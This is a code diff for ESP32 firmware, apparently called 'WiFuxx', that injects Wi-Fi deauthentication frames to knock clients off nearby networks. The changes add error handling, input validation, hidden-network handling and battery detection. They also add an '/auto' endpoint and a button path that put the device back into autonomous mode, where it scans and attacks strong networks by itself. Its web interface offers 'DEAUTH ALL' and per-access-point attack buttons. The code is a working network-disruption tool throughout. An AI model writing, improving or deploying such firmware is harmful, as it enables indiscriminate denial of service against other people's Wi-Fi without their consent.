@@ -139,6 +139,10 @@ static volatile bool g_webui_display = false;
 // screen before the device reboots (otherwise the reset is silent).
 static volatile bool g_webui_resetting = false;
 
+// Set after the first battery sample — true on the XIAO (divider present), false on
+// a bare DevKit. Gates Charge Mode in the WebUI and on /charge.
+static bool g_battery_present = false;
+
 // Deauth reason codes
 static const uint16_t deauth_reasons[] = {
     0x0001, 0x0003, 0x0006, 0x0007, 0x0008, 0x000C, 0x000D
@@ -315,7 +319,10 @@ static void oled_send_cmds(const uint8_t *cmds, size_t len) {
     if (len + 1 > sizeof(buf)) return;
     buf[0] = 0x00;
     memcpy(buf + 1, cmds, len);
-    i2c_master_write_to_device(I2C_MASTER_NUM, OLED_ADDR, buf, len + 1, pdMS_TO_TICKS(100));
+    esp_err_t err = i2c_master_write_to_device(I2C_MASTER_NUM, OLED_ADDR, buf, len + 1,
+                                               pdMS_TO_TICKS(100));
+    if (err != ESP_OK)
+        ESP_LOGW(TAG, "OLED cmd I2C write failed: %s", esp_err_to_name(err));
 }
 
 // Flush one page to hardware: 1 command transaction + 1 data transaction
@@ -326,7 +333,10 @@ static void oled_flush_page(uint8_t page) {
     uint8_t buf[129];
     buf[0] = 0x40;  // data stream control byte
     memcpy(buf + 1, fb[page], 128);
-    i2c_master_write_to_device(I2C_MASTER_NUM, OLED_ADDR, buf, 129, pdMS_TO_TICKS(100));
+    esp_err_t err = i2c_master_write_to_device(I2C_MASTER_NUM, OLED_ADDR, buf, 129,
+                                               pdMS_TO_TICKS(100));
+    if (err != ESP_OK)
+        ESP_LOGW(TAG, "OLED data I2C write failed (page %u): %s", page, esp_err_to_name(err));
     page_dirty[page] = false;
 }
 
@@ -562,6 +572,29 @@ static uint32_t get_time_sec(void) {
     return (uint32_t)(esp_timer_get_time() / 1000000ULL);
 }
 
+// Read an HTTP request body up to buf_sz-1 bytes (null-terminated). Returns the
+// number of payload bytes stored, or a negative value on a hard recv error.
+static int http_recv_body(httpd_req_t *req, char *buf, size_t buf_sz) {
+    int to_read = req->content_len;
+    if (to_read <= 0 || to_read >= (int)buf_sz)
+        to_read = (int)buf_sz - 1;
+
+    int received = 0;
+    while (received < to_read) {
+        int r = httpd_req_recv(req, buf + received, to_read - received);
+        if (r == HTTPD_SOCK_ERR_TIMEOUT) continue;
+        if (r <= 0) return received > 0 ? received : r;
+        received += r;
+    }
+    buf[received] = '\0';
+    return received;
+}
+
+static void wifi_check(esp_err_t err, const char *what) {
+    if (err != ESP_OK)
+        ESP_LOGE(TAG, "%s failed: %s", what, esp_err_to_name(err));
+}
+
 // ==================== Boot Mode Helpers ====================
 // Validate RTC state on entry. On a power-on/brown-out (magic absent or an
 // explicit power reset) force the autonomous ATTACK default; otherwise trust
@@ -616,11 +649,17 @@ static void send_deauth_frame(const uint8_t *ap_mac, uint16_t reason) {
     frame.reason[0] = reason & 0xFF;
     frame.reason[1] = (reason >> 8) & 0xFF;
 
-    esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
+    if (err != ESP_OK) {
+        static uint32_t tx_fail_count;
+        if ((++tx_fail_count % 256) == 1)
+            ESP_LOGW(TAG, "esp_wifi_80211_tx failed: %s (suppressing repeats)", esp_err_to_name(err));
+    }
 }
 
 // Attack all targets in one band's target list, iterating by channel
 static void attack_band(target_list_t *list, uint8_t burst_size, bool is_5ghz) {
+    (void)is_5ghz;
     if (list->count == 0) return;
 
     // Collect unique channels — at most MAX_TARGETS unique channels possible
@@ -648,9 +687,10 @@ static void attack_band(target_list_t *list, uint8_t burst_size, bool is_5ghz) {
                 send_deauth_frame(target->bssid, deauth_reasons[i % num_reasons]);
                 target->packets_sent++;
 
-                if (i % 8 == 7 && is_5ghz) {
+                // Yield on both bands so long bursts cannot starve the idle task
+                // and trip the task watchdog (CONFIG_ESP_TASK_WDT_TIMEOUT_S=5).
+                if (i % 8 == 7)
                     vTaskDelay(pdMS_TO_TICKS(1));
-                }
             }
             vTaskDelay(pdMS_TO_TICKS(TARGET_BURST_DELAY_MS));
         }
@@ -840,7 +880,10 @@ static uint16_t scan_and_filter_targets(void) {
     if (ap_num == 0) return 0;
 
     wifi_ap_record_t *ap_info = calloc(ap_num, sizeof(wifi_ap_record_t));
-    if (!ap_info) return 0;
+    if (!ap_info) {
+        ESP_LOGE(TAG, "Scan alloc failed (%u APs)", ap_num);
+        return 0;
+    }
     esp_wifi_scan_get_ap_records(&ap_num, ap_info);
 
     // Strongest-first: the MAX_TARGETS cap then takes the loudest APs above threshold.
@@ -933,7 +976,10 @@ static uint16_t scan_selected_targets(void) {
     if (ap_num == 0) return 0;
 
     wifi_ap_record_t *ap_info = calloc(ap_num, sizeof(wifi_ap_record_t));
-    if (!ap_info) return 0;
+    if (!ap_info) {
+        ESP_LOGE(TAG, "Scan alloc failed (%u APs)", ap_num);
+        return 0;
+    }
     esp_wifi_scan_get_ap_records(&ap_num, ap_info);
 
     auto_targets.count = 0;
@@ -946,7 +992,7 @@ static uint16_t scan_selected_targets(void) {
         bool match = (g_sel_mode == SEL_MODE_SINGLE)
                      ? (memcmp(ap->bssid, g_sel_mac, 6) == 0)
                      : (g_sel_ssid[0] != '\0' &&
-                        strncmp((char *)ap->ssid, g_sel_ssid, 32) == 0);
+                        strcmp((char *)ap->ssid, g_sel_ssid) == 0);
         if (!match) continue;
 
         attack_target_t *t = &auto_targets.targets[auto_targets.count];
@@ -1097,16 +1143,16 @@ static void display_task(void *pvParameters) {
         for (int row = 3; row <= 7; row++) oled_clear_page(row);
 
         if (info.ssid_count > 0) {
-            int start = 0;
-            if (info.ssid_count > max_ssid_lines) {
+            int visible = (info.ssid_count > max_ssid_lines)
+                        ? max_ssid_lines : info.ssid_count;
+            if (info.ssid_count > max_ssid_lines)
                 scroll_index = (scroll_index + 1) % info.ssid_count;
-                start = scroll_index;
-            } else {
+            else
                 scroll_index = 0;
-            }
 
-            for (int i = 0; i < max_ssid_lines && (start + i) < info.ssid_count; i++) {
-                strncpy(line_buf, info.ssid_list[start + i], 16);
+            for (int i = 0; i < visible; i++) {
+                int idx = (scroll_index + i) % info.ssid_count;
+                strncpy(line_buf, info.ssid_list[idx], 16);
                 line_buf[16] = '\0';
                 oled_draw_string(0, 3 + i, line_buf);
             }
@@ -1125,9 +1171,9 @@ static void wifi_init_sta(void) {
     esp_netif_create_default_wifi_sta();
 
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-    esp_wifi_init(&cfg);
-    esp_wifi_set_mode(WIFI_MODE_STA);
-    esp_wifi_start();
+    wifi_check(esp_wifi_init(&cfg), "esp_wifi_init");
+    wifi_check(esp_wifi_set_mode(WIFI_MODE_STA), "esp_wifi_set_mode");
+    wifi_check(esp_wifi_start(), "esp_wifi_start");
 
     esp_err_t ret = esp_wifi_set_promiscuous(true);
     if (ret != ESP_OK)
@@ -1206,7 +1252,7 @@ static const char WEBUI_HTML[] =
 "<div class='card'><h2>Scan</h2><div class='scan-row'><button class='btn btn-cyan' id='scan'>SCAN</button><span id='scanmsg'>Tap SCAN to discover networks.</span></div></div>\n"
 "<div class='card'><h2>Attack</h2><button class='btn btn-orange' id='all'>DEAUTH ALL</button></div>\n"
 "<div class='card'><h2>Networks</h2><div id='netlist'><p class='empty'>No scan yet.</p></div></div>\n"
-"<div class='card'><h2>Power</h2><button class='btn btn-cyan' id='charge'>CHARGE MODE</button></div>\n"
+"<div class='card'><h2>Power</h2><button class='btn btn-cyan' id='auto'>AUTO MODE</button><button class='btn btn-cyan' id='charge'>CHARGE MODE</button></div>\n"
 "<div class='card'><h2>Settings</h2>\n"
 "<label>AP SSID<input id='ap_ssid' maxlength='32'></label>\n"
 "<label>AP channel (1-13)<input id='ap_channel' type='number' min='1' max='13'></label>\n"
@@ -1230,19 +1276,22 @@ static const char WEBUI_HTML[] =
 "const toastEl=document.getElementById('toast');\n"
 "const esc=s=>String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/'/g,'&#39;');\n"
 "const toast=t=>{toastEl.textContent=t;toastEl.style.display='block';};\n"
-"function group(nets){const m={};for(const n of nets){(m[n.ssid]=m[n.ssid]||[]).push(n);}return m;}\n"
+"function gkey(n){return n.hidden?('h:'+n.mac):n.ssid;}\n"
+"function group(nets){const m={};for(const n of nets){const k=gkey(n);(m[k]=m[k]||[]).push(n);}return m;}\n"
+"function netLabel(aps){const n=aps[0];return n.hidden?('Hidden ('+n.mac+')'):n.ssid;}\n"
 "function render(nets){\n"
 "  if(!nets.length){listEl.innerHTML=`<p class='empty'>No networks found.</p>`;return;}\n"
 "  const g=group(nets);let html='';\n"
-"  for(const ssid in g){\n"
-"    const aps=g[ssid];\n"
+"  for(const key in g){\n"
+"    const aps=g[key];\n"
+"    const title=netLabel(aps);\n"
 "    const has24=aps.some(a=>a.band==='2.4');\n"
 "    const has5=aps.some(a=>a.band==='5');\n"
-"    html+=`<div class='net'><div class='net-head'><span class='net-ssid'>${esc(ssid)}</span>`;\n"
+"    html+=`<div class='net'><div class='net-head'><span class='net-ssid'>${esc(title)}</span>`;\n"
 "    if(has24)html+=`<span class='badge b24'>2.4G</span>`;\n"
 "    if(has5)html+=`<span class='badge b5'>5G</span>`;\n"
 "    html+=`</div>`;\n"
-"    if(has24&&has5)html+=`<div class='dual'><button class='btn-dual' data-ssid='${esc(ssid)}'>DUAL-BAND SAME AP</button></div>`;\n"
+"    if(has24&&has5&&!aps[0].hidden)html+=`<div class='dual'><button class='btn-dual' data-ssid='${esc(aps[0].ssid)}'>DUAL-BAND SAME AP</button></div>`;\n"
 "    for(const a of aps){\n"
 "      html+=`<div class='bssid'><span class='mac'>${a.mac}</span><span class='ch'>CH${a.channel}</span><span class='badge ${a.band==='5'?'b5':'b24'}'>${a.band}G</span><span class='rssi'>${a.rssi}</span><button class='btn-sm' data-mac='${a.mac}'>DEAUTH</button></div>`;\n"
 "    }\n"
@@ -1260,6 +1309,11 @@ static const char WEBUI_HTML[] =
 "  fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}).catch(()=>{});\n"
 "}\n"
 "document.getElementById('all').onclick=()=>attack({mode:'all'});\n"
+"document.getElementById('auto').onclick=()=>{\n"
+"  if(!confirm('Return to autonomous mode? WiFuxx will scan and attack strong networks on its own.'))return;\n"
+"  toast('Switching to Auto Mode...');\n"
+"  fetch('/auto',{method:'POST'}).catch(()=>{});\n"
+"};\n"
 "listEl.onclick=e=>{\n"
 "  const t=e.target;\n"
 "  if(t.dataset.mac)attack({mode:'single',mac:t.dataset.mac});\n"
@@ -1274,6 +1328,7 @@ static const char WEBUI_HTML[] =
 "function loadCfg(){fetch('/config').then(r=>r.json()).then(c=>{\n"
 "  $('ap_ssid').value=c.ap_ssid;$('ap_channel').value=c.ap_channel;$('thr_24').value=c.thr_24;$('thr_5').value=c.thr_5;\n"
 "  $('burst_24').value=c.burst_24;$('burst_5').value=c.burst_5;$('ui_user').value=c.ui_user;$('skip_splash').checked=c.skip_splash;\n"
+"  if(!c.has_battery){const ch=$('charge');if(ch)ch.style.display='none';}\n"
 "}).catch(()=>{});}\n"
 "loadCfg();\n"
 "$('cfgsave').onclick=()=>{\n"
@@ -1308,7 +1363,14 @@ static char *do_webui_scan_json(void) {
     uint16_t ap_num = 0;
     esp_wifi_scan_get_ap_num(&ap_num);
     wifi_ap_record_t *ap_info = ap_num ? calloc(ap_num, sizeof(wifi_ap_record_t)) : NULL;
-    if (ap_num && ap_info) esp_wifi_scan_get_ap_records(&ap_num, ap_info);
+    if (ap_num && !ap_info) {
+        ESP_LOGE(TAG, "WebUI scan alloc failed (%u APs)", ap_num);
+        return NULL;
+    }
+    if (ap_num && ap_info) {
+        esp_wifi_scan_get_ap_records(&ap_num, ap_info);
+        qsort(ap_info, ap_num, sizeof(wifi_ap_record_t), cmp_ap_rssi_desc);
+    }
 
     cJSON *arr = cJSON_CreateArray();
     uint8_t count_24 = 0, count_5 = 0;
@@ -1323,8 +1385,9 @@ static char *do_webui_scan_json(void) {
         if (is5) count_5++; else count_24++;
 
         cJSON *net = cJSON_CreateObject();
-        const char *ssid = (strlen((char *)ap->ssid) == 0) ? "Hidden" : (char *)ap->ssid;
-        cJSON_AddStringToObject(net, "ssid",    ssid);
+        bool hidden = (strlen((char *)ap->ssid) == 0);
+        cJSON_AddStringToObject(net, "ssid",    hidden ? "" : (char *)ap->ssid);
+        cJSON_AddBoolToObject  (net, "hidden",  hidden);
         cJSON_AddNumberToObject(net, "rssi",    ap->rssi);
         cJSON_AddStringToObject(net, "band",    is5 ? "5" : "2.4");
         cJSON_AddStringToObject(net, "mac",     mac);
@@ -1405,22 +1468,30 @@ static bool parse_mac(const char *s, uint8_t out[6]) {
 static esp_err_t attack_post_handler(httpd_req_t *req) {
     if (!webui_authorized(req)) return ESP_OK;
     char buf[256];
-    int n = httpd_req_recv(req, buf, sizeof(buf) - 1);
+    int n = http_recv_body(req, buf, sizeof(buf));
     if (n <= 0) { httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, NULL); return ESP_FAIL; }
-    buf[n] = '\0';
 
     cJSON *json = cJSON_Parse(buf);
     if (!json) { httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, NULL); return ESP_FAIL; }
 
     cJSON *mode_j   = cJSON_GetObjectItem(json, "mode");
-    const char *mode = (mode_j && cJSON_IsString(mode_j)) ? mode_j->valuestring : "all";
+    if (!mode_j || !cJSON_IsString(mode_j)) {
+        cJSON_Delete(json);
+        httpd_resp_set_status(req, "400 Bad Request");
+        httpd_resp_set_type(req, "application/json");
+        httpd_resp_sendstr(req, "{\"error\":\"missing mode\"}");
+        return ESP_OK;
+    }
+    const char *mode = mode_j->valuestring;
 
     uint32_t sel = SEL_MODE_ALL;
     uint8_t  mac[6] = {0};
     char     ssid[33] = {0};
     bool     ok = true;
 
-    if (strcmp(mode, "single") == 0) {
+    if (strcmp(mode, "all") == 0) {
+        sel = SEL_MODE_ALL;
+    } else if (strcmp(mode, "single") == 0) {
         cJSON *mac_j = cJSON_GetObjectItem(json, "mac");
         if (mac_j && cJSON_IsString(mac_j) && parse_mac(mac_j->valuestring, mac))
             sel = SEL_MODE_SINGLE;
@@ -1428,12 +1499,14 @@ static esp_err_t attack_post_handler(httpd_req_t *req) {
             ok = false;
     } else if (strcmp(mode, "dualband") == 0) {
         cJSON *ssid_j = cJSON_GetObjectItem(json, "ssid");
-        if (ssid_j && cJSON_IsString(ssid_j)) {
+        if (ssid_j && cJSON_IsString(ssid_j) && ssid_j->valuestring[0] != '\0') {
             strncpy(ssid, ssid_j->valuestring, sizeof(ssid) - 1);
             sel = SEL_MODE_DUALBAND;
         } else {
             ok = false;
         }
+    } else {
+        ok = false;
     }
     cJSON_Delete(json);
 
@@ -1473,6 +1546,7 @@ static esp_err_t config_get_handler(httpd_req_t *req) {
     cJSON_AddNumberToObject(o, "burst_5",     g_settings.burst_5);
     cJSON_AddStringToObject(o, "ui_user",     g_settings.ui_user);
     cJSON_AddBoolToObject  (o, "skip_splash", g_settings.skip_splash);
+    cJSON_AddBoolToObject  (o, "has_battery", g_battery_present);
 
     char *out = cJSON_PrintUnformatted(o);
     cJSON_Delete(o);
@@ -1488,9 +1562,8 @@ static esp_err_t config_post_handler(httpd_req_t *req) {
     if (!webui_authorized(req)) return ESP_OK;
 
     char buf[512];
-    int n = httpd_req_recv(req, buf, sizeof(buf) - 1);
+    int n = http_recv_body(req, buf, sizeof(buf));
     if (n <= 0) { httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, NULL); return ESP_FAIL; }
-    buf[n] = '\0';
 
     cJSON *j = cJSON_Parse(buf);
     if (!j) { httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, NULL); return ESP_FAIL; }
@@ -1546,10 +1619,29 @@ static esp_err_t config_reset_handler(httpd_req_t *req) {
 // board's power switch, so there's no in-band way back; the UI confirms first.
 static esp_err_t charge_post_handler(httpd_req_t *req) {
     if (!webui_authorized(req)) return ESP_OK;
+    if (!g_battery_present) {
+        httpd_resp_set_status(req, "400 Bad Request");
+        httpd_resp_set_type(req, "application/json");
+        httpd_resp_sendstr(req, "{\"error\":\"no battery hardware\"}");
+        return ESP_OK;
+    }
     ESP_LOGW(TAG, "WebUI charge request -> reboot into CHARGE");
     httpd_resp_set_type(req, "application/json");
     httpd_resp_sendstr(req, "{\"ok\":true}");
     reboot_into(BOOT_MODE_CHARGE);  // short delay (response flush) then esp_restart()
+    return ESP_OK;                  // not reached
+}
+
+// POST /auto — reboot into autonomous attack (threshold scan, no WebUI pick).
+static esp_err_t auto_post_handler(httpd_req_t *req) {
+    if (!webui_authorized(req)) return ESP_OK;
+    g_sel_mode = SEL_MODE_ALL;
+    memset(g_sel_mac, 0, sizeof(g_sel_mac));
+    g_sel_ssid[0] = '\0';
+    ESP_LOGW(TAG, "WebUI auto-mode request -> reboot into ATTACK (autonomous)");
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_sendstr(req, "{\"ok\":true}");
+    reboot_into(BOOT_MODE_ATTACK);
     return ESP_OK;                  // not reached
 }
 
@@ -1578,6 +1670,7 @@ static void http_server_start(void) {
         { .uri = "/config",       .method = HTTP_POST, .handler = config_post_handler },
         { .uri = "/config/reset", .method = HTTP_POST, .handler = config_reset_handler },
         { .uri = "/charge",       .method = HTTP_POST, .handler = charge_post_handler },
+        { .uri = "/auto",         .method = HTTP_POST, .handler = auto_post_handler },
     };
     for (int i = 0; i < (int)(sizeof(uris) / sizeof(uris[0])); i++)
         httpd_register_uri_handler(http_server, &uris[i]);
@@ -1618,8 +1711,8 @@ static void wifi_init_apsta_webui(void) {
     esp_netif_dhcps_start(ap_netif);
 
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-    esp_wifi_init(&cfg);
-    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    wifi_check(esp_wifi_init(&cfg), "esp_wifi_init");
+    wifi_check(esp_wifi_set_mode(WIFI_MODE_APSTA), "esp_wifi_set_mode");
 
     wifi_config_t ap_config = {
         .ap = {
@@ -1633,8 +1726,8 @@ static void wifi_init_apsta_webui(void) {
     strncpy((char *)ap_config.ap.ssid, g_settings.ap_ssid, sizeof(ap_config.ap.ssid) - 1);
     ap_config.ap.ssid_len = strlen((char *)ap_config.ap.ssid);
     ap_config.ap.channel  = g_settings.ap_channel;
-    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
-    esp_wifi_start();
+    wifi_check(esp_wifi_set_config(WIFI_IF_AP, &ap_config), "esp_wifi_set_config(AP)");
+    wifi_check(esp_wifi_start(), "esp_wifi_start");
     // No promiscuous mode in WebUI — raw deauth injection only runs in ATTACK boot.
 
     ESP_LOGI(TAG, "WebUI SoftAP '%s' (ch %d) up; open http://%s",
@@ -1642,7 +1735,7 @@ static void wifi_init_apsta_webui(void) {
 }
 
 // ==================== BOOT Button: hold to enter WebUI ====================
-// ATTACK boot only. A clean continuous 2s LOW on GPIO9 reboots into WebUI mode.
+// ATTACK boot only. A clean continuous 2s LOW on GPIO28 reboots into WebUI mode.
 static void button_task(void *pvParameters) {
     gpio_config_t io = {
         .pin_bit_mask = 1ULL << BOOT_BUTTON_GPIO,
@@ -1679,10 +1772,8 @@ static void button_task(void *pvParameters) {
 }
 
 // ==================== BOOT Button: hold to factory-reset (WebUI mode) ====================
-// WebUI boot only. The button does nothing else here, so a long 10s hold is a
-// safe "lockout escape": if a user sets a WebUI password and forgets it, holding
-// BOOT wipes settings (incl. auth) back to defaults and reboots into a fresh,
-// open WebUI. Does not affect the 2s hold-to-enter-WebUI in ATTACK mode.
+// WebUI boot only. Short hold (2s) on release returns to autonomous attack; a long
+// hold (10s) on release factory-resets settings (lockout escape when login is set).
 static void webui_button_task(void *pvParameters) {
     gpio_config_t io = {
         .pin_bit_mask = 1ULL << BOOT_BUTTON_GPIO,
@@ -1693,22 +1784,28 @@ static void webui_button_task(void *pvParameters) {
     };
     gpio_config(&io);
 
-    ESP_LOGI(TAG, "webui_button_task watching GPIO%d — hold %ds to factory-reset.",
-             BOOT_BUTTON_GPIO, BUTTON_RESET_HOLD_MS / 1000);
+    ESP_LOGI(TAG, "webui_button_task watching GPIO%d — release after %ds for Auto, %ds for factory-reset.",
+             BOOT_BUTTON_GPIO, BUTTON_HOLD_MS / 1000, BUTTON_RESET_HOLD_MS / 1000);
 
     uint32_t held_ms = 0;
     while (1) {
         if (gpio_get_level(BOOT_BUTTON_GPIO) == 0) {   // active LOW = pressed
             held_ms += BUTTON_POLL_MS;
+        } else if (held_ms > 0) {
             if (held_ms >= BUTTON_RESET_HOLD_MS) {
                 ESP_LOGW(TAG, "BOOT held %lums in WebUI -> FACTORY RESET", (unsigned long)held_ms);
                 settings_reset();
-                g_webui_resetting = true;            // display_task shows confirmation
-                vTaskDelay(pdMS_TO_TICKS(2500));     // let the user read it
-                reboot_into(BOOT_MODE_WEBUI);        // come back up fresh + open
+                g_webui_resetting = true;
+                vTaskDelay(pdMS_TO_TICKS(2500));
+                reboot_into(BOOT_MODE_WEBUI);
+            } else if (held_ms >= BUTTON_HOLD_MS) {
+                ESP_LOGW(TAG, "BOOT held %lums in WebUI -> AUTO ATTACK", (unsigned long)held_ms);
+                g_sel_mode = SEL_MODE_ALL;
+                memset(g_sel_mac, 0, sizeof(g_sel_mac));
+                g_sel_ssid[0] = '\0';
+                reboot_into(BOOT_MODE_ATTACK);
             }
-        } else {
-            held_ms = 0;   // released — require a clean continuous hold
+            held_ms = 0;
         }
         vTaskDelay(pdMS_TO_TICKS(BUTTON_POLL_MS));
     }
@@ -1791,6 +1888,7 @@ static void battery_update(void) {
     int sample_mv = mv_node * BATTERY_DIVIDER_RATIO;
     batt_mv = batt_valid ? batt_mv + (sample_mv - batt_mv) / BATTERY_EMA_DEN : sample_mv;
     batt_valid = true;
+    g_battery_present = (batt_mv >= BATTERY_PRESENT_MIN_MV);
 }
 
 // Approximate single-cell LiPo resting-voltage -> state-of-charge curve. The top
@@ -1852,6 +1950,8 @@ static void charge_mode_run(void) {
 
         // Single dim line — fewest lit pixels = least OLED draw. The XIAO 'C' LED
         // is the real charge indicator (out = full).
+        oled_clear_page(0);
+        oled_draw_string(0, 0, ">> CHARGE MODE");
         oled_clear_page(2);
         if (batt_valid && batt_mv >= BATTERY_PRESENT_MIN_MV) {
             int v10 = batt_mv / 10;                 // centivolts
@@ -1894,7 +1994,12 @@ void app_main(void) {
     // Common peripherals
     oled_init();
     display_mutex = xSemaphoreCreateMutex();
-    battery_init();   // XIAO GPIO6/26 sense — used by charge mode + the live display glyph
+    if (!display_mutex)
+        ESP_LOGE(TAG, "display_mutex create failed");
+    battery_init();
+    battery_update();
+    g_battery_present = batt_valid && (batt_mv >= BATTERY_PRESENT_MIN_MV);
+    ESP_LOGI(TAG, "Battery hardware: %s", g_battery_present ? "detected" : "not detected");
 
     if (g_boot_mode == BOOT_MODE_CHARGE) {
         // -------- Charge mode: Wi-Fi off, low power, battery readout --------
